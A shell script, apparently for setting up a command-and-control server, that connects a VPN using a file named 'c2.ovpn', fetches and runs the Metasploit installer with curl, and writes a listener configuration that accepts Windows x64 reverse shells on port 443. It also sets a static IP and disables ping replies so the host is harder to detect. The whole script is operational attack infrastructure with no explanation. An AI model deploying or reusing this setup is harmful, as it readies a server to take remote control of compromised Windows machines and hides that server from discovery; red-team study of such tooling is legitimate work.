#!/bin/sh
#Setup environement and isntall required packages
export PATH=$PATH:/usr/bin
apt install -y openvpn
apt install -y network-manager-openvpn
apt install -y ntpdate
#update
apt-get update
#update time and launch vpn
echo "#!/bin/sh 
ntpdate ntp.ubuntu.com 
openvpn --config c2.ovpn --daemon  --log openvpn.log" > /root/ntp.sh
chmod +x /root/ntp.sh
/root/ntp.sh
#install metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall
/tmp/msfinstall
echo "use exploit/multi/handler" > /root/rcFile.rc
echo "set PAYLOAD windows/x64/shell/reverse_tcp" >> /root/rcFile.rc
echo "set LHOST 0.0.0.0" >> /root/rcFile.rc
echo "set LPORT 443" >> /root/rcFile.rc
echo "exploit -j" >> /root/rcFile.rc
#change IP Address(static addressing case)
sed -i '6s/.*/       - 192.168.9.249\/24/' /etc/netplan/00-installer-config.yaml
netplan apply
echo "net.ipv4.icmp_echo_ignore_all=1" >> /etc/sysctl.conf
sysctl -p
